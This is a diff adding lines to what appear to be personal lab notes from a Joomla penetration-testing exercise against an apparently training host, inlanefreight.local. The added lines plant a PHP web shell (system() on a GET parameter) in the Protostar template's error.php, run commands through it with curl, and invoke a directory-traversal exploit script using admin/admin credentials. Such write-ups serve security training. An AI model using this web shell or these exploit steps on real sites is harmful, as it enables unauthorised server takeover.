@@ -38,3 +38,11 @@ During the Joomla enumeration phase and the general research hunting for company
 ```bash
 # Going to the TEMPLATES -> Configuration
 ```
+![[Pasted image 20260930212116.png]]
+Under the template column then using that Protstar.
+`system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`
+Then curling
+`curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id`
+Then able to get the flag by changing the `id` to the command you would like to use.
+### Finding the Admin?
+`python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /`
